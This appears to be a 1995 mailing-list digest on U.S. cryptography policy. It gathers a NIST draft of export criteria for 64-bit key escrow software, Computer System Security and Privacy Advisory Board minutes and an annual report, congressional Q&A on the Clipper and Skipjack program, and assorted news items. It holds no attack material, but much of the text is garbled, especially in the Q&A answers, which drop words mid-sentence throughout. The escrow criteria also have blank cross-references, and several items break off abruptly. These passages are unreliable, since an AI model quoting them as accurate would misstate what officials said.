day, we plan to discuss the export licensing process for
such products, and begin exploring characteristics of
acceptable key escrow agents.
Again, thank you for your participation.  I look forward
to seeing you there.
Raymond G. Kammer
Deputy Director
Key Escrow Issues Meeting, September 6-7, 1995
Discussion Paper Export Criteria Discussion Draft -- 64-bit Software Key
Escrow Encryption
As discussed at the SPA/AEA meeting on August 17, 1995,
the Administration is willing to allow the export of
software encryption provided that the products use
algorithms with key space that does not exceed 64 bits
and the key(s) required to decrypt messages/files are
escrowed with approved escrow agents. On the same date,
the September 6-7 key escrow issues meeting at NIST was
also announced.  The two principal topics at the meeting
will be:  discussion of issues of exportability of 64-bit
software key escrow encryption and 2) desirable
characteristics for key escrow agents.
In order to help make most productive use of the limited
time available at the upcoming meeting and to better
focus deliberation, the following criteria are being
distributed for discussion purposes.  Since it is
important that final criteria be clear, straightforward,
consistent, and implementable, please review these draft
criteria and be prepared to discuss how they may be
refined and made more specific.
Draft Export Criteria for Software Key Escrow Encryption
Software key escrow encryption products meeting the
following criteria will be granted special export
licensing treatment similar to that afforded other
mass-market software products with encryption.
1.   The product will use an unclassified encryption
     algorithm (e.g., DES, RC4) with a key length not to
     exceed 64 bits.
2.   The product shall be designed to prevent multiple      encryption (e.g., triple-DES).
3.   The key required to decrypt each message or file
     shall be accessible through a key escrow mechanism
     in the product, and such keys will be escrowed
     during manufacture in accordance with   If such
     keys are not escrowed during manufacture, the
     product shall be inoperable until the key is
     escrowed in accordance with 4.   The key escrow mechanism shall be designed to
     include with each encrypted message or file, in a
     format accessible by authorized entities, the
     identity of the key escrow agent(s), and
     information sufficient for the escrow agent(s) to
     identify the key or key components required to
     decrypt that message.
5.   The product shall be resistant to any alteration
     that would disable or circumvent the key escrow
     mechanism, to include being designed so that the
     key escrow mechanism cannot be disabled by a static
     patch, (i.e., the replacement of a block of code by
     a modified block).
6.   The product shall not decrypt messages or files
     encrypted by non-escrowed products, including
     products whose key escrow mechanisms have been
     altered or disabled.
7.   The key escrow mechanism allows access to a user's
     encrypted information regardless of whether that
     user is the sender or the intended recipient of the
     encrypted information.
8.   The key escrow mechanism shall not require repeated
     involvement by the escrow agents for the recovery
     of multiple decryption keys during the period of
     authorized access.
9.   In the event any such product is or may be
     available in the United States, each production
     copy of the software shall either have a unique key
     required for decrypting messages or files that is
     escrowed in accordance with  or have the
     capability for its escrow mechanism to be rekeyed
     and any new key to be escrowed in accordance with
     10.  The product shall accept escrow of its key(s) only
     with escrow agents certified by the U.S. Government
     or by foreign governments with which the U.S.
     Government has formal agreements consistent with
     U.S. law enforcement and national security
     requirements.
Note: Software products incorporating additional
encryption methods other than key escrow encryption
methods will be evaluated for export on the basis of each
encryption method included, as is already the case with
existing products. Accordingly, these criteria apply only
to the key escrow encryption method incorporated by a
software product, and not to other non-escrowed
encryption methods it may incorporate.  For instance,
non-escrowed encryption using a key length of 40 bits
or less will continue to be exportable under existing
export regulations.
- - -
Please also review discussion paper  (distributed
earlier), which raises a number of issues involving
exportability criteria and how exportable products could
be designed.  Discussion paper  (also previously
distributed) presents questions involving key escrow
Note:  These issues will be discussed at the Key Escrow
Issues Meeting to be held September 6-7, 1995 (9:00 a.m.
- 5:00 p.m.) at the National Institute of Standards and
Technology (Gaithersburg, Maryland).  The meeting will be
open to the public, although seating is limited.  Advance

Future Information Warfare Study Available
San Francisco, Sept. 6, 1995 -- Computer Security
Institute's "Special Report on Information Warfare"
describes how war might be fought in the 21st century.
The report will appear in the fall issue of the Computer
Security Journal, but is available now on request.
Patrice Rapalus, director of Computer Security Institute
(CSI), told Newsbytes, "In recent weeks, mass media
organizations such as Time Magazine, the Washington Post,
and National Public Radio have done stories on
information warfare. This report is a timely,
comprehensive and practical study on information warfare
and its impact on our future."
The report defines information warfare in contrast to
simple computer crime, "A computer crime is an act that
violates a law. It could be specifically targeted. It
could be isolated, or it could be one element of an
overall plan of attack. The conduct of information
warfare, in contrast, is never random or isolated (and
may not even violate a law). The term implies a concerted
effort to utilize information as a weapon with which to
wage war, whether on an actual battlefield or in
economic, political, or social arenas."
Four aspects of information warfare are listed in the
report: the electronic battlefield; infrastructure
attacks; industrial espionage; and personal privacy
"It is important to understand that the term 'information
warfare' originated in the military and in its purest
sense refers to the grim and dangerous business of
real...country shattering war,"  says the report.
Computer Security Institute is located in San Francisco,
California, and is a wholly owned subsidiary of Miller
Freeman Publishing. Miller Freeman publishes over fifty
trade magazines including Dr. Dobbs Journal, Unix Review,
and LAN Magazine.
Computer Security Institute publishes, along with random
studies like the "Special Report on Information Warfare,"
a monthly newsletter, a semi-annual Journal, an annual
Buyers Guide, and a on-line bulletin board.

Information Warfare," call 415-905-2310.
"Snooper" Software Digs Into Computers
San Francisco, Sept. 6, 1995 -- Vias & Associates Inc.
said it has introduced a new version of its "Snooper"
system information utility. The author of the software
said it is called Snooper because the program "snoops"
around the computer to report its configuration and
operating characteristics.
John Vias of Vias & Associates said his
company's program goes farther than other system
information programs, including Microsoft's MSD
(Microsoft System Detection), which is included in higher
versions of the company's DOS operating systems. "I think
Snooper is about the most accurate system information
utility you can get," he said. "People say it's easy to
use. It takes just one keystroke to go from the main
screen to any other screen. It also has a built-in editor
for 'autoexec' and 'config' files."
In all, Snooper can detect more than 150 details about a
person's computer, including CMOS settings, hard drive
type and capacity, any installed Micro Channel cards,
fax-modems, memory types and amount available to the
user, and video memory and type.
Snooper is targeted to all markets, Vias officials said,
including the average user, network administrators,
consultants, and technicians.
In the provided documentation is a wish list regarding
new features for future versions of Snooper, including
brand detection of additional non-Intel central
processing units (CPUs), detection of local bus cards and
tapes, and the ability to differentiate among different
types of hard drives.
Although Snooper can run in either DOS or Windows, Vias
said the program works best in the DOS environment. In
Windows, some of the software's reports must be disabled.
In addition, some of the test results may be in error or
unpredictable. Snooper requires an IBM PC or 100%
compatible machine, with at least 256 kilobytes (KB) of
RAM, a DOS with version 3.1 or higher, and some kind of
video card. Snooper retails for around $39, and is
available as both a full version and as shareware.
Vias also said he is working hard on a Windows 95 version
of Snooper. When tested the software on a Windows 95
machine running in DOS mode, no problems were
experienced. But running it in Windows mode made the
program very unpredictable.
UK - PCMCIA Encryption Card Introduced
London, Sept. 5, 1995 -- PPCP, a PCMCIA (Personal
Computer Memory Card International Association)
specialist, has begun shipping the Session Key, a PCMCIA
Type II card from SCI Canada.
According to John Nolan, the company's managing director,
the card allows users to encrypt data on their PC hard
disk, as well as across serial port linked devices, such
as modems, using the DES algorithm. DES stands for Data
Encryption Standard, a US-originated high security
encryption system that is virtually unbreakable.
According to Nolan, the Session Key allows users to
protect their data on a selective basis. "Many of the
competing systems out there are only capable of
encrypting the user's entire hard disk. That obviously
protects the user's data, but if you forget your
password, you have serious problems," he explained.
"With the Session Key card, you create a new drive, the
'D' drive, to store the encrypted data. The card also
allows data to be transmitted by modem in DES format.
That allows a user maximum flexibility," he said.
When used to encrypt data on a user's hard disk, once the
Session Key is removed from the PCMCIA slot, all data on
the disk that is encrypted is protected against
unauthorized access. The encrypted data cannot be read or
used without reinserting the UKP349 card.
Nolan said that SCI has developed a second-generation
version of the Session Key, which will be available later
this year. "That version will use RSA encryption
techniques, as well Triple DES and a whole host of other
encryption systems," he said.
One of the problems with encryption devices like the
Session Key is the fact that the US Government currently
bans the export of certain types of encryption
technologies, as well as restricts the sale of many
technologies to "known parties."
According to Nolan, this approval system can cause the
company a few administrative problems. "We need to find
out who is the actual end-user and pass their details
back to SCI. My understanding is that the vetting is then
carried out at a government level in Canada or the US,"
he said. He added that, apart from a short delay,
typically a week or so before the card can be shipped to
the customer, there is usually no problem.

Cleaning the Web: Companies to Seek Pornography Blocker
Array of Technology Firms Will Join in Effort to Let
Parents Screen the Internet
By Jared Sandberg
Some of the high-tech industry's biggest companies are
banding together in a broad-based consortium to develop
a way for Internet users to screen out pornography and
other offensive material.
The group, whose creation is expected to be announced on
Monday, is believed to include International Business
Machines Corp. and Microsoft Corp., telecommunications
giants AT&T Corp. and MCI Communications Corp., on-line
firms America Online Inc. and Netscape Communications
Corp. Entertainment heavyweights Time Warner Inc. and
Viacom Inc. also have been approached.
People familiar with the plans said the consortium hopes
to develop industrywide standards for obscenity-blocking
technology as a way to forestall much-criticized
proposals from federal regulators. It amounts to an
effort to develop a voluntary Internet equivalent of the
"v-chip" that has been proposed as a way for parents
block sex-and-violence-laden TV programs.
The venture will pursue a system that would allow
Internet users -- such as teachers or parents -- to
prevent pornography from being accessed by children.
The group will be led by the World Wide Web Consortium at
the Massachusettes Institute of Technology, executives
said. The consortium, funded by roughly 80 companies,
aids in the development of the Web, the multimedia
portion of the Internet, by producing technical
specifications and software.
Various companies have worked on ways to shield children
from indecent material. The new consortium will pursue an
overarching method available to all Internet players --
software firms, access providers and on-line services.
MIT will coordinate this "umbrella organization to
prevent industry infighting," said one executive. "It's
aimed at creating a standard that all the software
companies can develop for." A separate project by
Microsoft and Netscape, together with two smaller firms,
SurfWatch Software Inc. and Progressive Networks Inc.,
will now be folded into the new consortium, another
executive said.
The effort follows such proposals as the antipornography
provision of Sen. James Exon (D., Neb.), which won
overwhelming support in the Senate and would slap prison
terms on people who make "indecent" remarks on-line.
Most of the proposals have been met with scorn from the
Internet industry. Executives have said that legislators
could cripple the commercial growth of the Internet
before it emerges from infancy.

@_subject: Nice Guys 
NY Times, Sept. 10, 1995.
   The Decline of the Nice-Guy Quotient
   By Daniel Goleman
   Contrary to conventional wisdom, nice guys do finish first.
   The trouble is, nice guys are harder and harder to find.
   Amid the agonizing over standardized intelligence tests
   comes a new problem to worry about. Psychologists seeking
   a broader measure of intelligence, one that accounts for
   the personality traits that seem to predict success better
   than IQ alone, have discovered that a newly minted virtue
   they call "emotional intelligence" is declining as well.
   A recent study done at Bell Laboratories the high-tech
   think tank near Princeton N.J., found that the most valued
   and productive engineers -- at least among electrical
   engineers working in teams of up to 150 people -- were not
   those with the highest IQs, the highest academic
   credentials or the best scores on achievement tests.
   Instead, the stars were those whose congeniality put them
   at the heart of the informal communication networks that
   would spring up during times of crisis or innovation.
   When these likeable engineers hit a snag and E-mailed for
   help, they got an answer instantly; when others less gifted
   in interpersonal realms sent similar messages, they
   sometimes waited days or weeks for a reply.
   The standouts excelled in rapport, empathy, cooperation,
   persuasion and the ability to build consensus among people.
   The new term for these traits is emotional intelligence,
   which, in addition to the social graces, includes the
   ability to read one's own feelings, to control one's own
   impulses and anger, to calm oneself down and to maintain
   resolve and hope in the face of setbacks.
   To predict the success of a financial analyst or
   geophysicist, IQ is still crucial. But within a pool of
   high-lQ people, those with high emotional intelligence will
   have an extra competitive edge.
   Emotional intelligence, like self-knowledge and personal
   charisma, has long been seen as ineffable, more the stuff
   of poets and philosophers than psychometricians. And yet,
   despite all that, the measuring has begun.
   In the mid-1970s, and again in the late 1980s, Thomas
   Achenbach, a psychologist at the University of Vermont, had
   thousands of American children assessed by their parents
   and teachers on a behavioral checklist. He found that over
   the course of that decade and a half, America's children,
   on average, had become more anxious and depressed, more
   impulsive and mean, more demanding and disobedient, more
   hot-tempered and aggressive -- and not just in beleaguered
   urban neighborhoods.
   The study found growing emotional deficits even among the
   children of the wealthiest suburbs. Although the scores
   were worst for the poorest children, the rate of decline
   was the same for all, privileged and impoverished alike.
   Apparently, students continue to be receptive even into
   their teen years. Neuroscientists have found that the
   centers in the prefrontal lobes that control emotional
   impulse are among the last parts of the brain to reach full
   maturity, sometime in mid- to late adolescence.
   Now, at last, from the emotional literacy front there is
   some promising news: Children in the courses show marked
   improvements in the ability to control their impulses, show
   empathy, cooperate with others, manage anger and anxiety,
   focus on a task, pursue goals and resolve conflicts.
   Delinquency, fights and drug use drop.
   And there is an added bonus: achievement test scores rise
   too.

Minutes of the March 22-23, 1995 Meeting of the
  Computer System Security and Privacy Advisory Board
Wednesday, March 22, 1995
A quorum being present, the Chairman, Dr. Willis Ware,
called the meeting to order at 9:00 a.m. at the Holiday
Inn, Gaithersburg, Maryland.  Besides Dr. Ware, the
following Board members were present:  Charlie Baggett
Jr., Genevieve Burns, Cris Castro, Don Gangemi, Sandra
Lambert, Henry Philcox, Randy Sanovic, Stephen Trodden,
Steve Walker [TIS], and Bill Whitehurst [IBM].
[Snip long section on security assurance standards and
methods in US, Canada and UK.]
Update on X/Open Branding Project
Mr. Bill Whitehurst, IBM, gave a brief update of the
activities of the X/Open Branding Project.
Two major components exist within their branding concept:
(1) the ability to implement functionality based on a
minimum set of assurance functionality requirements
(MSFR), and (2) the confidence in the development process
for achieving the functionality.
He said that the workgroup meeting, hosted by Hewlett
Packard, was held early in March.  The group plans to
re-write their document to include some type of
evaluation process prior to the vendor product getting
branded.  X/Open plans to have a public review of the
changes this summer.
Vendor Perspective
Ms. Linda Vetter, Oracle Corporation, presented oracle's
views of security assurance.  She discussed three types
of assurance issues: (1) governent evaluation and
certification; (2) third party evaluation and
certification (government and business sponsored); and
(3) vendor claims.
Ms. Vetter explained Oracle s evaluation experience for
two DBMS server product s, Oracle7 and Trusted Oracle7,
in both the US and the UK.  Oracle used the US TCSEC TPEP
evaluation for B1 and C2 systems.  They also used the UK
ITSEC evaluation for E3 systems (which is the equivalent
for US B1 and C2 systems).  The UK process took
significantly less time and cost less money for an
identical product.  Ms. Vetter suggested that NIST/NSA
look into developing equivalent/comparable trust levels
between the two different evaluation criteria methods as
well as those for other countries.  This would minimize
the need to have different evaluations performed (one for
each country) for the same product.
Oracle has on-going work in other areas (e.g., RAMP, CMM,
ISO, and Audits) as well as multiple CLEFS with the UK,
Sweden, France and Germany.  Ms. Vetter explained the
differences in criteria between the TCSEC and the ITSEC. She said that the ITSEC requirements for the content of
evaluation deliverables formed a superset of the
corresponding TCSEC requirements for the evaluations. However, the TCSEC creates a framework for the
presentation of these requirements and there can be
little deviation from this.
Oracle would like to see more concentration on low-end
assurance requirements and processes.  This would enable
various sectors like health care, banking, and financial
industries to have protection for unclasified to
sensitive data.  Ms. Vetter encouraged NSA to continue
its efforts in modeling (Common Assurance Framework,
TCMM, and SE CMM) and would discourage any more efforts
in product profiling.  The modeling efforts encourage
vendor quality improvement, promotes flexibility in
meeting assurance objectives, and are transferable to
other private sector domains besides DoD.  (See Reference
Wrap-up and Restatement of Issues
Dr. Katzke summarized the discussion of assurance by
saying that opportunities exist to look at alternatives. He is not sure what the government's role is or which
areas to concentrate on with respect to cost.  He said
that he could continue with the same level of effort that
is going on now with community involvement.  He is open
to suggestions with regard to the assurance process.
After a lengthy discussion on the state of the Common
Criteria (CC) and assurance approaches and issues, some
of the major points from individual Board members
-  Concern as to when the CC will be widely accepted and
   used;
-  Whether to adopt the ITSEC now and migrate to CC;
-  The need to simplify the CC;
-  Building assurance and quality into the new assurance
   framework;
-  Clearly define assurance needs to be universally
   understood;
-  Conduct more C2 and below evaluations in the US;
-  Concentrate on low-end assurance; and
-  Bring key industry players into the process.
Board members continued their discussion of criteria and
assurance from the previous day.  Some of the major
points of the discussion from Board members included the
-  for OMB to state the need for C2 level evaluation
   compliance for various government product purchases;
-  for NSA to make a statement about equivalency among
   all existing non-US trust levels;
-  to begin using components of the Common Criteria and
   gradually migrate to it;
-  to continue a wide range of assurance framework
   options and procedures; and
-  to focus on low-end assurance methods and encourage C2
   level evaluation along the following Canadian AL-1
   evaluation.
Status of Key Escrow Initiative
Mr. Steve Walker, Trusted Information Systems (TIS),
briefed the Board on the status of Commercial Key Escrow
(CKE).  He said, with regard to application vendors, TIS
is actively seeking the participation of commercial
software vendors in widespread implementation of CKE
enabled software products.  TIS has installed a Data
Recovery Center (DRC) on the Internet and is prepared to
distribute sample DRC application software packages to
any interested software application developer.  TIS is
seeking approval of the US government for export of
application programs using encryption algorithms such as
the Data Encryption Standard (DES) when properly bound
with CKE.
Mr. Walker said the advantages of CKE for government
interests is that if the TIS CKE system were to become
widely used throughout the private sector and government
communities, law enforcement, national security and
private sector interests would be preserved.
Mr. Walker said that TIS has filed for patent protection
for its Software Key Escrow (Clipper equivalent) and CKE
systems including the DRC and application software
approaches.  TIS is prepared to license its CKE system
and software applications technology to any software or
hardware vendor under very favorable licensing terms. TIS is also prepared to license its DRC system and
technology to qualified DRC operators and vendors under
similarly favorable licensing terms.  (See Reference

Identifying Emerging Computer Security Issues
What is the Computer System Security and Privacy Advisory
Board (CSSPAB)?
Congress established the CSSPAB as a public advisory
board in the Computer Security Act of 1987.  The Board is
composed of twelve members, in addition to the
Chairperson, who are recognized experts in the fields of
computer and telecommunications systems security and
What is the Board's purpose?
The Computer Security Act specifies that the Board's
mission is to identify emerging managerial, technical,
administrative, and physical safeguard issues relative to
computer systems security and privacy.
What is the scope of the Board's authority?
The Board examines those issues affecting the security
and privacy of sensitive unclassified information in
federal computer and telecommunications systems.  The
Board's authority does not extend to private-sector
systems or federal systems which process classified
What are the board's advisory and reporting functions?
The Board advises the Secretary of Commerce and the
Director of the National Institute of Standards and
Technology (NIST) on computer security and privacy issues
pertaining to sensitive unclassified information stored
or processed by federal computer systems. The Board
reports its findings to the Secretary of Commerce, the
Director of the Office of Management and Budget, the
Director of the National Security Agency, and appropriate
committees of Congress.
How often and where does the Board meet?
The Board holds its two-day meetings twice per year;
however, additional meetings may be called at the
Chairperson's discretion. Board meetings are held in the
Washington, DC metropolitan area as well as other areas
in which there is significant federal computer security
interest and activity.
Are Board meetings open to the public?
In accordance with the Federal Advisory Committee and
Government in Sunshine acts, Board meetings are announced
in the Federal Register and are normally open to the
public.  The Board accepts written statements from the
public (see address on reverse).
How is CSSPAB membership determined?
The Director of NIST of the Department of Commerce
appoints Board members for four-year terms.  By law, the
membership of the Board is distributed as follows:
-  Four experts from outside of federal government, one
   whom is representative of small- or medium-size firm;
-  Four non-government employees who are not employed by
   or a representative of a producer of computer or
   telecommunications equipment; and
-  Four members from the federal government, including
   one from the National Security Agency of the
   Department of Defense.
Nominations to fill vacancies on the Board may be
submitted to the Director of NIST.
NIST personnel serve as the Board's Secretariat.  Other
federal agency personnel may also assist the Board's
activities as specified in the Computer Security Act of
Are Board members paid for their service?
Board members do not receive a salary or stipend;
however, authorized travel expenses are reimbursed as
specified by Congress.

Executive Summary
This Annual Report documents activities of the National
Computer System Security and Privacy Advisory Board
during 1994, its sixth year.
During the year, the Board continued to review
cryptography related issues.  During 1994, the
Escrowed Encryption Standard (EES) and the Digital
Signature Standard (DSS) were approved as Federal
Information Processing Standards (FIPS 185) and (FIPS
186) respectively.  The Board heard briefings on
escrowing release procedures, escrow program procedures,
U.S. export procedures, international cryptography
proposals, international corporate key escrow,
alternative key escrow approaches, and software-based key
escrow encryption.
The Board also continued to follow activities related to
the Common Criteria (CC), which remains in draft form. [Comments on the CC will be reviewed and processed in
March 1995.] The Board continued to examine the
question as to whether there is a business case for
setting up a Trusted Technology Assessment Program
Currently, Dr. Willis H. Ware, a senior researcher of the
Corporate Research Staff of RAND, serves as Chairman of
the Board.  He was appointed in July 1989.  As of
December 1994, the membership of the Board is as follows:
-  Chairman
   Willis H. Ware, RAND
-  Federal Members
   Charlie C. Baggett, Jr. National Security Agency
   Henry H. Philcox, Department of the Treasury, Internal
      Revenue Service

   Stephen T. Walker, Trusted Information Systems, Inc.
   Bill Whitehurst, International Business Machines Corp.
In December of 1994, Ms. Cynthia Rand resigned from the
Board, leaving a vacancy in the federal member category.
              II. Major Issues Discussed
The work of the Board during 1994 was devoted to various
topics related to security of federal unclassified
automated information systems.  Among the most important
-  Cryptographic Key Escrowing Procedures
-  Alternative Key Escrow
-  Security in the National Information Infrastructure
   (NII)
Escrowing Release/Program Procedures
The Department of Justice briefed the Board on procedures
for release of cryptographic key components, by the two
escrow agents, to government agencies.  The two escrow
agents at the National Institute of Standards and
Technology (NIST), of the Department of Commerce and the
Automated Systems Division of the Department of Treasury. The agents act under strict procedures to ensure the
security of the key components and which govern their
release for use in conjunction with lawful wiretaps.
NIST discussed the procedures for the key escrow program. Five federal agencies share a role in the key escrow
program:  (1) the Department of Justice is a sponsor and
a family key agent that holds one of the components of
the family key, (2) the Federal Bureau of Investigation
is the initial law enforcement user and a family key
agent that holds the other component of the family key,
(3) NIST has a dual role as the program manager and a key
escrow agent, (4) the Department of Treasury is a key
escrow agent; and (5) the National Security Agency
is the system developer that provides technical
Alternative Key Escrow
Bankers Trust presented some rationales for key escrow
encryption for corporations, which fulfills management
supervision and compliance duties, and reduces business
risks.  They maintain that the Bankers Trust system can
meet both U.S. and European needs.  Their system has been
discussed with Canada, Britain, France, Singapore, and
the U.S.; however, none of these countries have
endorsed the system.
Trusted Information Systems, Inc. gave a demonstration
and overview of their approach to software-based key
escrow encryption.  They said that software key escrow
systems could be built that meet the objectives of law
enforcement.  Also, that variations of their software key
escrow system can provide a commercial key escrow
capability that will be very appealing to corporate and
individual computer users.  They believe that widespread
use of corporate key escrow, in which corporations
operate their own key escrow centers, and individual key
escrow, in which bonded commercial key escrow centers
provide a key retrieval capability for registered users,
will better achieve the key escrow objectives of law
enforcement than a government-operated key escrow

C.I.A.'s Chief Calls Covert Action a Must
Washington, Sept. 12 -- The Central Intelligence Agency
will maintain, and perhaps increase, its covert
operations abroad and continue to hire informers from
terrorist cells, military regimes and drug syndicates,
the new Director of Central Intelligence said today.
The Director, John M. Deutch, called espionage "the core
mission of the Central Intelligence Agency." That mission
has been questioned by critics of the C.I.A. in Congress
and the foreign-policy establishment, who wonder whether
the rewards of secret information are worth the risks of
undertaking covert operations and recruiting murderous
and corrupt foreign agents.

telecommunications the NSA and the FBI want most to decode will the very people most unlikely to use this technology?
Answer:   From what we know today, the overriding requirement spies, terrorist, and criminals have is for readily available easy to use equipment that interoperates.  Key escrow encryption is
not meant to be a tool to catch criminals.  It will make encryption available to legitimate businesses and private without allowing criminals to use the telecommunications system plan and commit crimes with impunity.  We believe it would be
irresponsible for government to make excellent encryption available knowing that its use by criminals would make it
impossible for law enforcement agencies to conduct lawful against them.
The Department of Justice credits information gleaned through
wiretaps as leading to more than 20,000 felony convictions the early 1980s.  This would not have been possible if the
criminals had been using encryption systems the FBI could not
Without government action, however, this fortunate situation
will change.  At present most people, and most criminals, don't encryption.  However, there is an increasing public awareness the value of encryption for protecting private personal and
business communications.  Increasing demand for encryption by public will likely lead to the widespread use of some form of
standardized encryption on the public telecommunications This development would have great benefits for the country.
Legitimate businesses an private individuals could use the
telecommunications system secure in the knowledge that their
private information such as business records and credit card
numbers could not be intercepted by third parties.
But there is a down side.  Criminals, terrorists, and others
could also use the system to plan crimes, launder money, and like, completely secure in the knowledge that law enforcement
agencies could not listen to those communications.  Just as
legitimate businesses operate much more efficiently and using the telecommunications system than they could without it, will criminal enterprises be able to operate more efficiently effectively if they no longer have to avoid using the
telecommunications system.
The United States is faced with a choice.  We can sit back and
watch as the emerging national information infrastructure a valuable tool for criminals and terrorists to use to plan and
carry out their activities with complete security, or we can steps to maintain the current ability of government to conduct
lawful wiretaps so that prudent criminals will have to find less efficient ways to operate and foolish ones may be caught.  escrow encryption is the later option.
Q:   Would widespread use of the Skipjack algorithm harm U.S.
exports?  Do you think it is unlikely foreign businesses will
purchase American encryption technology if the U.S. Government
holds a set of the decoding keys?
     Answer:  I do not believe that widespread use of key encryption in the United States will harm U.S. exports.  If it any effect at all, it could increase exports somewhat.  Key encryption products provide another option for foreign that they have not had in the past; to the extent that doe purchase key escrow encryption products, it will mean an
increase in exports.  Meanwhile, U.S. exporters are free to
continue to sell the products they currently sell in foreign
markets and to seek license approvals for new products.
     It is difficult to predict the foreign market for U.S. key
escrow encryption technology.  Businesses that fear U.S. interception of their communications presumably would avoid
products for which the U.S. Government hold keys.  However, are a number of reasons why foreign businesses might purchase One major reason would be to communicate securely with U.S.
businesses that use them.  In addition, the superior level of
security provided by key escrow products (against all but U.S. Government access) may make them attractive to foreign
business that do not view U.S Government access as a major While some prospective users abroad may steer clear of key products because the United States will retain access, there may be
many who believe they are unlikely to be targeted by U.S.
intelligence in any case or for whom the superior security by key escrow encryption products against threats of greater
concern may make key escrow products an attractive option.  For
example, a distributor of pay-TV programming may depend on
encryption to ensure that only those viewers who pay for the
service can decrypt the TV signal.  Such a distributor probably
would not be concerned about the threat of access by the United
States Government, and might favor suitable key escrow products over competing products that use weaker encryption
Q:   You were present when the previous panelist, Stephen described how present U.S. laws prohibit his company from encryption products.  As I understand it, Senator Murray's bill
S.1846, attempts to relax these export controls somewhat.
Please give us your views on this legislation.
     Answer:  I support the Administration's position, as by the White House on February 4, that current export controls remain in place and that regulatory changes should be to speed exports and reduce the licensing burden on exporters.  bill you reference appears to be inconsistent with the
Administration position.  I would be happy to provide you information on the Administration's reasons for maintaining the
current export controls in an appropriate setting.
*Questions from Senator Murray:
Q:    In my office in the Hart building this February, I from the Internet an Austrian program that uses DES encryption.
This was on a laptop computer, using a modem over a phone line.
The Software Publishers' Association says there are at least DES or comparable programs world wide.  However, U.S. export
control laws prohibit American exporters from selling DES programs abroad.
With at least 20 million people hooked up to the
Internet, how do U.S. export controls actually prevent terrorists, or whoever from obtaining DES encryption software?
     Answer:  Serious users of encryption do not entrust their
security to software distributed via networks o bulletin There is simply too much risk that viruses, Trojan Horses,
programming errors, and other security flaws may exist in such
software which could not be detected by the user.  Serious users of
encryption, those who depend on encryption to protect valuable and cannot afford to take such chances, instead turn to other
sources in which they can have greater confidence.  Such users include not only entitles which may threaten U.S. security interests, but also businesses and other major of encryption products.  Encryption software distribution via
Internet, bulletin board, or modem does not undermine the
effectiveness of encryption export controls.   [Primary written questions for Admiral McConnell]
1.   The Defense Authorization Bill for Fiscal Year 1994 has
authorized $800,000 to be spent by the National Research Council of
the National Academy of Sciences to conduct a study of federal
encryption policy.  Can we wait to implement the key escrow
encryption program until we have the benefit of the NRC's Do you think this study is necessary?  Should this study be
     Answer:  We do not believe that we can wait until after NRC study is completed in 1996 to begin implementation of the escrow initiative.  The information technology industry is and fast-moving, and to wait another two years or more would, believe, jeopardize the success of the initiative.  Industry for encryption products is growing, and the technology is now to meet that demand with encryption products that provide outstanding level of security to the user conduct lawful To wait for the completion of the NRC study to other encryption
products which would defeat lawful wiretaps.  We believe that a delay would not be in the best interest of the American Neither do we believe that the study should be expedited.  For
our part, we will carefully consider the conclusions of the NRC
study.  We expect that it will give very careful consideration the issues, and we would not want the pressure of an short deadline to limit the study group's ability to produce best report possible.
2.   The Administration has said that it is continuing to export of the most sophisticated encryption devices, in part,
"because of the concerns of our allies who fear that strong
encryption technology would inhibit their law enforcement
capabilities."  Do we really need to help our allies by the export of strong American encryption products, since those countries can simply control the encryption bought within their
     Answer:  Exports of encryption products are subject to primarily to protect U.S. national interests, including security, law enforcement, foreign policy, and other important
interests.  The law enforcement concerns of our allies are a
consideration, especially as the ability of our allies to terrorism, drug trafficking, and other international law
enforcement problems can have direct benefits to the United However, foreign law enforcement concerns do not drive our control policy.  We would continue to review encryption exports protect U.S. national interests even if foreign law enforcement
concerns disappeared.
3.   Do you know whether foreign governments would be interested in
importing key escrow encryption products to which they hold the
decoding keys?
     Answer:  Several foreign governments have expressed in key escrow encryption technology due to their own law
enforcement concerns.  There have been some preliminary
discussions, but issues such as who would hold the escrowed and the circumstances of government access to escrowed keys must be
fully vetted.
4.   The Government wants the key escrow encryption standard to
become the de facto industry standard in the United States.  the Government abandon the Clipper Chip program if it is shown be unsuccessful beyond government use?
     Answer:  We do not expect the program to be unsuccessful
beyond government.  We have developed a sound security product we expect will find many uses in government information systems further believe that government use will bring with it a market, particularly in the defense sector.  We have developed sound security product that we expect will find many uses in
government information systems regardless of its success in
commercial markets.
5.   Openly available devices, such as Intel-compatible
microprocessors, have seen dramatic gains, but only because
everyone was free to try to build a better version.  Given the
restrictions on who can build devices with the classified algorithm, how will key escrow chips keep up with advances in
semiconductor speed, power, capacity and integration?
     Answer:  Despite the requirements that a firm must meet to
produce key escrow encryption chips, we expect that there will a number of manufacturers competing against each other to the best product, and that such competition will drive them to up with the latest technological advances.  It is worth noting only a few companies can produce the sophisticated you reference, yet the competition in that market has driven to achieve remarkable advances in that technology.  NSA's secure telephone program provides an example of a cryptographic
product line that keeps pace with technology.
The presence of a classified algorithm does not preclude
keeping pace with technology.  Through NSA's use of a multi-vendor approach, STU-III secure telephone products have
continued to evolve in response to user requirements and
technological advances despite their use of a classified algorithm and the consequent need for security restrictions on 6.   How well does the Skipjack algorithm work on
telecommunications operating at very high speeds.  Is NSA on another algorithm, called BATON, that could be used in high
speeds with a key escrow system?  Will Capstone be compatible      Answer:  Using currently available microelectronics the SKIPJACK algorithm could not be used for encryption at very
high speeds.  BATON is the name of an algorithm developed by that could be used at higher rates of speed.  We have no plans develop key escrow encryption devices using BATON, however.
Instead, we are considering another algorithm for use at high
speeds with a key escrow system.
A high-speed key escrow device based on an algorithm other
than SKIPJACK would not be "compatible with Capstone" in the that traffic encrypted by such a device could not be decrypted Capstone, and vice versa.  However, since such a device would used for much higher-speed applications than those for which
Capstone was designed, there would be no need for it to be
compatible with Capstone in that sense.
7.   Can Capstone be used to encrypt video programming?  If so,
have cable companies been approached by any government agency use Capstone to scramble or encrypt cable program?
     Answer:  Capstone could be used to encrypt any digital including video programming, operating at up to about 10 bits per second.  It could be used for encrypting individual channels but not for bulk encryption of many channels together in a single link.  NSA is not aware of any government
agency approaching cable companies to urge the use of Capstone.
Two manufacturers have asked us about the suitability of key devices for this purpose, however.
8.   Encryption software is available that can be used with to encypt a message before after it has been encrypted with
Clipper.  This "double encrypting" risks bypassing the key feature.  If a sender first encrypts the message with software
using DES, and then transmits the message "double encrypted" Clipper, can tell you from looking at the cipher, or encrypted
text, that the underlying message was encrypted?
     Answer:  The only way to tell that a message has been encrypted" in this way would be to decrypt the "outer layer" of
encryption, i.e. that done with Clipper.  Only then would one able to tell that the message had first been encrypted with
something else.

Picking the Crypto Locks
A new technique called differential cryptanalysis can
break even DES quickly
By Peter Wayner
How secure is your encrypted data? Advances in
